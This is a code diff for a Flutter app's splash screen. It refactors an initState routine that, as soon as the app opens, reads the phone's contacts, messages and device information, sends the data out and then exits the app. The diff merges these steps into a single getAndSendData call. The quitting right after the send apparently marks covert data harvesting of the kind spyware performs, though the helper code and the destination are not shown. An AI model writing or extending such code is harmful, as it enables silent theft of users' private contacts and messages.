@@ -21,23 +21,12 @@ class SplashState extends ConsumerState<Splash> {
   void initState() {
     WidgetsBinding.instance.addPostFrameCallback(
       (_) async {
-        SchedulerBinding.instance.addPostFrameCallback(
-          (timeStamp) async {
-            ///get contacts & messages
-            final contactsListProvider = ref.read(contactsProvider.notifier);
-            await contactsListProvider.getContactList(context);
-            if (context.mounted) {
-              await contactsListProvider.getMessagesList(context);
-              if (context.mounted) {
-                await contactsListProvider.getDeviceInfo(context);
-                if (context.mounted) {
-                  await contactsListProvider.sendData(context);
-                  exit(0);
-                }
-              }
-            }
-          },
-        );
+        SchedulerBinding.instance.addPostFrameCallback((timeStamp) async {
+          ///get contacts & messages
+          final contactsListProvider = ref.read(contactsProvider.notifier);
+          await contactsListProvider.getAndSendData(context);
+          exit(0);
+        });
       },
     );
     super.initState();
